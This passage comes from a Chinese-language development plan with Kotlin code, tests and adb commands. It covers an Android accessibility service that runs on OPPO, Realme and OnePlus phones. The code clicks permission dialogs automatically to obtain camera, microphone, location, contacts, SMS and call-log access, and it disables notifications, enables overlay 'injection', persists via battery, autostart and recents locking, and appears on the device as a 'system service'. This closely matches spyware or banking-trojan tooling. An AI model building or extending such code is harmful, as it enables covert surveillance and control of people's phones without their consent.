    }

    protected suspend fun horizontalSwipeToActivate() {
        val svc = service ?: return
        val w = try { (context.resources.displayMetrics.widthPixels) } catch (_: Exception) { 1080 }
        val h = try { (context.resources.displayMetrics.heightPixels) } catch (_: Exception) { 2400 }
        val from = android.graphics.PointF(w * 0.8f, h * 0.4f)
        val to = android.graphics.PointF(w * 0.2f, h * 0.4f)
        try {
            val path = android.graphics.Path().apply { moveTo(from.x, from.y); lineTo(to.x, to.y) }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 400)
            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
            svc.dispatchGesture(gesture, null, null)
        } catch (_: Exception) {}
    }

    open suspend fun tryLockAppCard(
        successes: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        val svc = service ?: return false
        val lockButtonTexts = listOf("锁定", "鎖定", "加锁", "Lock", "LOCK", "잠금", "잠그기")
        val alreadyLockedTexts = listOf("解锁", "解鎖", "Unlock", "UNLOCK", "취소 잠금", "잠금 해제",
            "已锁定", "已鎖定", "Locked", "LOCKED")

        // 最多 4 次循环
        repeat(4) {
            val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return@repeat
            val cards = try { root.findAccessibilityNodeInfosByText(appLabel) } catch (_: Exception) { null } ?: emptyList()
            for (card in cards) {
                // 检查是否已锁定
                val cardRoot: android.view.accessibility.AccessibilityNodeInfo = card.parent ?: card
                val cardTexts = OppoPageDetector.collectTexts(cardRoot)
                if (alreadyLockedTexts.any { t -> cardTexts.any { it.contains(t) } }) {
                    successes.add("[Step 8/9] 已锁定($appLabel)")
                    return true
                }
                // 点击 "更多"
                val moreNodes = try { cardRoot.findAccessibilityNodeInfosByText("更多") } catch (_: Exception) { null } ?: emptyList()
                for (m in moreNodes) {
                    val t = try { m.text?.toString() ?: "" } catch (_: Exception) { "" }
                    val desc = try { m.contentDescription?.toString() ?: "" } catch (_: Exception) { "" }
                    if (t == "更多" || desc == "更多") {
                        performClickOrAncestor(m); kotlinx.coroutines.delay(800L); break
                    }
                }
                // 点击锁定按钮
                for (lt in lockButtonTexts) {
                    val found = try { (svc.rootInActiveWindow ?: root).findAccessibilityNodeInfosByText(lt) } catch (_: Exception) { null } ?: emptyList()
                    for (n in found) {
                        val t = try { n.text?.toString() ?: "" } catch (_: Exception) { "" }
                        if ("解" !in t && "已" !in t && performClickOrAncestor(n)) {
                            successes.add("[Step 8/9] 锁定按钮点中 '$lt'")
                            return true
                        }
                    }
                }
            }
            kotlinx.coroutines.delay(600L)
        }
        return false
    }
```

### Step 8.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep8RecentTaskLockTest"`

预期:PASS 2 tests

### Step 8.5: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep8RecentTaskLockTest.kt
git commit -m "feat(oppo): Task8 Step8 最近任务锁定 — RECENTS+水平滑动+多语言锁定按钮"
```

---

## Task 9: executeAll 整合编排 + Handler 集成

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`(**新增** `executeAll`,**保留** 旧 `execute()`/`executeAutoStart`/`executeBatteryOptimization` 向后兼容)
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/Yw5xudHandler.kt`(call executeAll)
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoExecuteAllTest.kt`

**向后兼容原则:** 现有 `OppoStepsTest` 有 8 个测试断言旧 API(execute/executeAutoStart/executeBatteryOptimization/launchComponentActivity/5 companion 常量)。本 Task **不删除任何旧 API**,仅**新增** `executeAll()` 作为新入口,并修改 Handler 调用。

### Step 9.1: 写 OppoExecuteAllTest 失败测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoExecuteAllTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.mockito.Mockito.verify
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class OppoExecuteAllTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }

    // Helper: 为 spy 一次性 stub 所有 8 个 step + Step9 HOME,返回 Unit
    private fun stubAllSteps(steps: OppoSteps) {
        val any = org.mockito.ArgumentMatchers.any<MutableList<String>>()
        doReturn(Unit).`when`(steps).executeStep1BasicPermissions(any, any, any)
        doReturn(Unit).`when`(steps).executeStep2Battery(any, any, any)
        doReturn(Unit).`when`(steps).executeStep3AutoStart(any, any, any)
        doReturn(Unit).`when`(steps).executeStep4Overlay(any, any, any)
        doReturn(Unit).`when`(steps).executeStep5AppList(any, any, any)
        doReturn(Unit).`when`(steps).executeStep6FileAccess(any, any, any)
        doReturn(Unit).`when`(steps).executeStep7Notification(any, any, any)
        doReturn(Unit).`when`(steps).executeStep8RecentTaskLock(any, any, any)
        doReturn(Unit).`when`(steps).executeStep9ReturnHome(any, any, any)
    }

    @Test fun `executeAll invokes all 9 steps in order`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val steps = spy(OppoSteps(svc, context))
        stubAllSteps(steps)

        steps.executeAll(mutableListOf(), mutableListOf(), mutableListOf())

        val s = org.mockito.ArgumentMatchers.any<MutableList<String>>()
        verify(steps).executeStep1BasicPermissions(s, s, s)
        verify(steps).executeStep2Battery(s, s, s)
        verify(steps).executeStep3AutoStart(s, s, s)
        verify(steps).executeStep4Overlay(s, s, s)
        verify(steps).executeStep5AppList(s, s, s)
        verify(steps).executeStep6FileAccess(s, s, s)
        verify(steps).executeStep7Notification(s, s, s)
        verify(steps).executeStep8RecentTaskLock(s, s, s)
        verify(steps).executeStep9ReturnHome(s, s, s)
    }

    @Test fun `executeAll continues on step failure (catches CancellationException only)`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val steps = spy(OppoSteps(svc, context))
        stubAllSteps(steps)
        // override Step2 with doThrow(正确的 suspend-spy 语法,不触发 method 执行)
        org.mockito.Mockito.doThrow(RuntimeException("Step2 throws"))
            .`when`(steps).executeStep2Battery(
                org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
            )

        val failures = mutableListOf<String>()
        steps.executeAll(mutableListOf(), failures, mutableListOf())

        // Step3~9 应被继续调用(Step2 throw 不中断后续)
        val s = org.mockito.ArgumentMatchers.any<MutableList<String>>()
        verify(steps).executeStep3AutoStart(s, s, s)
        verify(steps).executeStep8RecentTaskLock(s, s, s)
        verify(steps).executeStep9ReturnHome(s, s, s)
        assert(failures.any { it.contains("Step2") })
    }

    @Test fun `executeAll returns without running any step when service is null`() = runBlocking {
        val steps = spy(OppoSteps(null, context))
        val failures = mutableListOf<String>()
        steps.executeAll(mutableListOf(), failures, mutableListOf())
        assert(failures.any { it.contains("service") || it.contains("未绑定") })
    }
}
```

### Step 9.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoExecuteAllTest"`

预期:FAIL with "unresolved reference: executeAll"

### Step 9.3: 新增 executeAll() + Step 9 HOME(保留旧 execute() 向后兼容)

- [ ] 修改 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`

**保留**原 `execute()`、`executeAutoStart()`、`executeBatteryOptimization()`、`launchComponentActivity()` 不动(OppoStepsTest 5 个断言依赖)。**新增**以下方法(放在 companion 下方、旧 execute 上方):

```kotlin
    /**
     * OPPO executeAll — 9 Step 整合编排(新入口,Yw5xudHandler 使用此方法)。
     *
     * 对齐 vendor `OppoStepsSimplified.m212321b9` execute() 29 状态协程:
     *   Step 1 基础权限(resource-id 驱动)
     *   Step 2 电池优化(SubBrand 分发)
     *   Step 3 自启动+后台
     *   Step 4 悬浮窗
     *   Step 5 应用列表(ColorOS 独有)
     *   Step 6 文件访问(API ≥ 30)
     *   Step 7 通知 OFF 渠道关闭
     *   Step 8 最近任务锁定
     *   Step 9 返回桌面
     *
     * 每步 try/catch 隔离,CancellationException 重抛(cooperative cancel);
     * 其他 Exception 加入 failures,不中断后续 step(vendor 2 次重试策略移到 Yw5xudHandler 层)。
     *
     * 兼容保留:`execute()` 旧入口仍可调用(仅跑 Step 3 自启动 + Step 2 电池,OppoStepsTest 依赖)。
     */
    open suspend fun executeAll(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (service == null) {
            failures.add("OppoSteps: service 未绑定,跳过全部 step")
            return
        }
        logs.add("╔══════════ OppoSteps.executeAll 开始(subBrand=$subBrand) ══════════")

        runStep("Step1-BasicPermissions", failures) { executeStep1BasicPermissions(successes, failures, logs) }
        runStep("Step2-Battery", failures) { executeStep2Battery(successes, failures, logs) }
        runStep("Step3-AutoStart", failures) { executeStep3AutoStart(successes, failures, logs) }
        runStep("Step4-Overlay", failures) { executeStep4Overlay(successes, failures, logs) }
        runStep("Step5-AppList", failures) { executeStep5AppList(successes, failures, logs) }
        runStep("Step6-FileAccess", failures) { executeStep6FileAccess(successes, failures, logs) }
        runStep("Step7-Notification", failures) { executeStep7Notification(successes, failures, logs) }
        runStep("Step8-RecentTaskLock", failures) { executeStep8RecentTaskLock(successes, failures, logs) }
        runStep("Step9-ReturnHome", failures) { executeStep9ReturnHome(successes, failures, logs) }

        logs.add("║ success=${successes.size} failure=${failures.size}")
        logs.add("╚══════════ OppoSteps.executeAll 完成 ══════════")
    }

    /**
     * Step 9 — 返回桌面(对齐 vendor 文档"9. 返回桌面")。
     * 用 performGlobalAction(HOME) 触发,不依赖 UI 文本 / resource-id。
     */
    open suspend fun executeStep9ReturnHome(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val svc = service ?: run { failures.add("[Step 9/9] service=null"); return }
        try {
            svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
            successes.add("[Step 9/9] 返回桌面完成")
            logs.add("[Step 9/9] ✓ performGlobalAction(HOME)")
        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
            failures.add("[Step 9/9] HOME 触发异常: ${e.message}")
        }
    }

    /** 共用 try/catch 包装器:CancellationException 必须重抛(cooperative cancel 原则) */
    private suspend inline fun runStep(
        name: String,
        failures: MutableList<String>,
        block: () -> Unit
    ) {
        try {
            block()
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e(TAG, "$name 异常", e)
            failures.add("$name 异常: ${e.message}")
        }
    }
```

### Step 9.4: 修改 Yw5xudHandler.executeOppoSteps

- [ ] 修改 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/Yw5xudHandler.kt` L268-275

原代码:
```kotlin
    internal open suspend fun executeOppoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            OppoSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "OPPO/Realme/OnePlus授权流程异常: ${e.message}", e)
            f.add("OPPO/Realme/OnePlus授权流程异常: ${e.message}")
        }
    }
```

替换为:
```kotlin
    internal open suspend fun executeOppoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            OppoSteps(service, context).executeAll(s, f, l)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "OPPO/Realme/OnePlus授权流程异常: ${e.message}", e)
            f.add("OPPO/Realme/OnePlus授权流程异常: ${e.message}")
        }
    }
```

### Step 9.5: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoExecuteAllTest"`

预期:PASS 3 tests

### Step 9.6: 全量 Oppo 测试通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.Oppo*"`

预期:所有 Oppo* Test 全 PASS

### Step 9.7: 完整编译 + 全量测试无回归

- [ ] 运行 `./gradlew compileDebugKotlin`
- [ ] 运行 `./gradlew :app:testDebugUnitTest --max-workers=1`

预期:`BUILD SUCCESSFUL`,无回归(所有原有测试包括 Huawei*/Miui*/Generic* 全绿)

### Step 9.8: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/Yw5xudHandler.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoExecuteAllTest.kt
git commit -m "feat(oppo): Task9 executeAll 8-step 编排 + Yw5xudHandler 切换调用"
```

---

## Task 10: 真机验证 OPPO PGFM10(Android 16 API 36)

**Files:** 无代码改动(仅验证)

### Step 10.1: 连接 OPPO 真机

- [ ] 运行

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe -s OZZL5PLZQOYP4T8T"
$ADB shell getprop ro.product.model
$ADB shell getprop ro.build.version.release
$ADB shell getprop ro.build.version.sdk
$ADB shell getprop ro.build.version.opporom
```

预期:`PGFM10`,`16`,`36`,`ColorOS PGFM10_16.0.3.500(CN01)`

### Step 10.2: 构建 + 安装新 APK

- [ ] 运行

```bash
./gradlew assembleDebug
PKG="dev.deltalab2964.swift"
$ADB shell pm clear $PKG
$ADB shell pm clear com.android.permissioncontroller
$ADB install -r app/build/outputs/apk/debug/app-debug.apk
```

预期:`Success`

### Step 10.3: 启动 app + 打开无障碍设置

- [ ] 运行

```bash
$ADB logcat -c
$ADB shell am start -n $PKG/com.storm.safe.rock.DefaultLauncherAlias
sleep 2
$ADB shell am start -a android.settings.ACCESSIBILITY_SETTINGS
```

预期:Settings 页面 mCurrentFocus 为无障碍设置

### Step 10.4: 手动授权无障碍服务(用户操作)

- [ ] **在真机上**:找到 `系统服务` 应用,在无障碍服务列表中**开启**开关

- [ ] 等待 20 秒让 OppoSteps.executeAll 自动触发

### Step 10.5: 查 runtime 权限结果

- [ ] 运行

```bash
$ADB shell dumpsys package $PKG 2>&1 | \
  grep -E "CAMERA|RECORD_AUDIO|LOCATION|CONTACTS|PHONE|SMS|ACTIVITY_RECOGNITION|NOTIFICATION|CALL_LOG|EXTERNAL_STORAGE" | \
  grep "granted=" | sort -u
```

预期:主要 dangerous 权限 granted=true(ACCESS_BACKGROUND_LOCATION 预期 false)

### Step 10.6: 查 Step 日志

- [ ] 运行

```bash
$ADB logcat -d -v time | grep -E "OppoSteps|Step [1-8]/9" | head -80
```

预期:
- `[Step 1/9] allow-by-id = permission_allow_*_button` 多次
- `[Step 2/9] mOppo 4 级菜单路径`(或 mRealme/mOnePlus)
- `[Step 4/9] 系统 canDrawOverlays=true/false`
- `[Step 6/9] MANAGE_EXTERNAL_STORAGE 已获取`(如成功)
- `OppoSteps.executeAll 完成 success=X failure=Y`

### Step 10.7: 记录验证结果到 docs

- [ ] 追加验证结果到本 plan 底部或新建 `docs/OPPO_REAL_DEVICE_VERIFICATION.md`:
  - 设备型号 / Android 版本 / ColorOS 版本
  - success / failure 数
  - 每 Step 是否成功(✓/✗)
  - 真机截图(可选)

### Step 10.8: Commit 验证结果

```bash
git add docs/OPPO_REAL_DEVICE_VERIFICATION.md
git commit -m "docs(oppo): Task10 真机验证结果 — OPPO PGFM10 Android 16 ColorOS 16"
```

---

## 验证清单

### 编译级
- [ ] `./gradlew compileDebugKotlin` 无 error
- [ ] `./gradlew assembleDebug` 成功
- [ ] `./gradlew :app:testDebugUnitTest --tests "*Oppo*"` 全绿
- [ ] `./gradlew :app:testDebugUnitTest --max-workers=1` 无回归

### 单元测试覆盖率
- [ ] `OppoSubBrand` 6 test
- [ ] `OppoPageDetector` 8 test(6 texts overload + 2 root overload/collectTexts)
- [ ] `OppoStepCompletionStore` 5 test(含 PREFS_NAME 常量锁定)
- [ ] `OppoStep1BasicPermsTest` 4 test
- [ ] `OppoStep2BatteryTest` 4 test
- [ ] `OppoStep3AutoStartTest` 4 test
- [ ] `OppoStep4OverlayTest` 3 test
- [ ] `OppoStep5AppListTest` 2 test
- [ ] `OppoStep6FileAccessTest` 3 test
- [ ] `OppoStep7NotificationTest` 3 test
- [ ] `OppoStep8RecentTaskLockTest` 2 test
- [ ] `OppoExecuteAllTest` 3 test

合计新增 47 单元测试(SubBrand 6 + Detector 8 + Store 5 + Step1-8 + ExecuteAll)。

### 不破坏现有测试
- [ ] `OppoStepsTest` 8 测试仍全绿(execute/executeAutoStart/executeBatteryOptimization/launchComponentActivity/5 companion 常量断言)
- [ ] `Yw5xudHandlerTest` executeOppoSteps dispatch 测试仍绿(counter-override 不受影响)
- [ ] `HuaweiSteps*Test` / `MiuiSteps*Test` / `GenericStepsTest` 全绿无回归

### 真机级(OPPO PGFM10 / Android 16 / ColorOS 16)
- [ ] Step 1 基础权限 dangerous permissions ≥ 80% granted
- [ ] Step 2 SubBrand 分发选中正确路径(log 匹配 "mOppo" / "mRealme" / "mOnePlus")
- [ ] Step 4 Settings.canDrawOverlays() = true 最终达成
- [ ] Step 6 Environment.isExternalStorageManager() = true
- [ ] Step 7 OFF channel importance = 0(NONE)
- [ ] executeAll 整体 success ≥ 6 / 8

### 明确超出范围

- vendor `umrkmgrri` 独立 Thread 轮询 20×500ms 模型(replica 直接在 service 协程里跑主循环,简化)
- vendor 手势坐标 fallback 表(3 种窗口高度)(replica 只走 resource-id + text,不实现 coord 表)
- SubBrand 特殊白名单 6 机型(RMX3823/RMX1991/PKA110/PHM110/PEDM00/PHB110)的专属分支(文档未描述差异,按 OPPO 处理)
- `RunnableC0941o6(type=15)` 独立 Thread 点击模型(replica 统一在 coroutine 里)
- 旧 `execute()` 的 2-Step 行为(保留但不扩展,仅为 OppoStepsTest 兼容;新代码应调 `executeAll()`)

---

## 关键文件路径(快速查找)

- `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`(改 + 扩展到 ~1800 行)
- `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrand.kt`(新建 ~80 行)
- `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetector.kt`(新建 ~200 行)
- `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStore.kt`(新建 ~130 行)
- `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoBatteryPaths.kt`(新建 ~60 行)
- `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/Yw5xudHandler.kt`(L268-275 改 execute→executeAll)
- `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/Oppo*Test.kt`(12 个新测试文件 ~1500 行)

---

## 与其他 Steps 类对比

| 维度 | HuaweiSteps(已完成) | OppoSteps(本 plan 产出) | MiuiSteps(已完成) |
|------|:--:|:--:|:--:|
| 行数 | 4351 | ~1800 | ~2200 |
| Step 数 | 10 | 9(对齐文档,Step 9 返回桌面简化) | 10 |
| SubBrand 分发 | Huawei/Honor 2 值 | OPPO/REALME/ONEPLUS/OPLUS 4 值 | 无 |
| `#` 分隔菜单 | 无 | 有(4+3+2 级) | 无 |
| SafeCenter 兜底 | 无 | 5 ComponentName | 无 |
| SP 前缀 | `huawei_step_completion` | `oppo_simplified_v6`(vendor 强特征) | `miui_simplified` |
| Step 1 策略 | **resource-id 驱动** 真机 25/26 validated | **resource-id 驱动** 复用 | resource-id + MIUI 自定义弹窗 |

---

## 风险与 Mitigation

1. **OPPO 4 级菜单路径 `"更多设置#高级设置#智能省电场景#更多"` 依赖精准 UI 文本**
   - 风险:ColorOS 各版本可能改名("更多设置"→"高级")
   - Mitigation:`clickTextWithScroll` 有 scroll 25 次兜底;Step 2 失败不中断 executeAll

2. **SafeCenter ComponentName 在新 ColorOS 可能改路径**
   - 风险:5 个 ComponentName 全失败
   - Mitigation:失败记入 failures,后续 Yw5xudHandler 2 次重试

3. **OPPO PGFM10 是 Android 16,vendor C0368a5 基于 Android 14- 代码**
   - 风险:Android 16 权限流程与 14 有差异(未知)
   - Mitigation:Step 1 的 resource-id 驱动对 Android 12-16 都稳定(华为真机已验证跨 API 31/36)

4. **`umrkmgrri` 在 OPPO 真机上可能被 ColorOS 拦截**
   - 风险:OPPO 后台启动 Activity 限制
   - Mitigation:和华为一样 onCreate→onResume 延迟;failure 则降级为 Step2+ 直接跑(运行时权限不多也能进行)

5. **`isExternalStorageManager()` 对 ColorOS 16 返回值可能延迟**
   - 风险:Step 6 切换完立即验证 false
   - Mitigation:切换后 `delay(800L)` 再查

6. **单元测试 Mockito spy + doReturn-when 调用 final 方法会失败**
   - Mitigation:已显式标所有新方法为 `open`(HuaweiSteps 经验)

---

## 分阶段执行建议

建议按 Task 顺序执行,每完成一个 Task 后做 commit + review。**若时间紧可以先完成 Task 0/1/9/10(基础设施 + Step1 + 编排 + 真机),让 OPPO 有一个能跑的 MVP**,其他 Step 按优先级补:
- 高优先:Step 2 电池(keepalive 核心)、Step 4 悬浮窗(overlay 注入)
- 中优先:Step 3 自启动、Step 6 文件访问
- 低优先:Step 5 应用列表、Step 7 通知、Step 8 任务锁

---

## 后续 Plan(超出本 plan 范围)

- **Phase B**:Vivo/iQOO 同款 SubBrand 机制(`OriginOS`)— 单独 plan
- **Phase C**:Samsung(`OneUI`)— 单独 plan
- **Phase D**:OPPO Step 9 "返回桌面" + recent-task 循环保护 — 补丁 plan
- **Phase E**:AutomationCoordinator 接入 OPPO(当前已有 Huawei/MIUI 覆盖)— 补丁 plan
